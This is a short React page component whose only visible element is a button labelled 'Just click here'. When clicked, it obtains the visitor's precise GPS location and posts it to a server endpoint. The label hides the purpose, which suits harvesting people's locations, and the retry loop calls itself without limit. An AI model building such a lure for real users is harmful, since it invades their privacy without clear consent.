import { useState } from "react";

export default function Home() {
  const [location, setLocation] = useState(null);
  const [error, setError] = useState(null);

  const getLocation = () => {
    if (!navigator.geolocation) {
      alert("Geolocation is not supported by your browser.");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        
        console.log(`Location Accuracy: ${accuracy} meters`);
        
        if (accuracy > 5) {  // Retry if accuracy is too low
          alert("Trying to get a more precise location. Please wait...");
          getLocation(); 
          return;
        }
    
        setLocation({ latitude, longitude });
    
        fetch("/api/send-location", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ latitude, longitude }),
        })
          .then(() => alert("Location sent successfully!"))
          .catch(() => alert("Failed to send location."));
      },
      (error) => {
        alert("Failed to get location. Check GPS and try again.");
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
    
  };

  return (
    <div style={{ textAlign: "center", marginTop: "50px" }}>
      <button onClick={getLocation} style={{ padding: "10px", fontSize: "16px" }}>
        Just click here
      </button>
      {location && (
        <p>
          Latitude: {location.latitude}, Longitude: {location.longitude}
        </p>
      )}
      {error && <p style={{ color: "red" }}>{error}</p>}
    </div>
  );
}
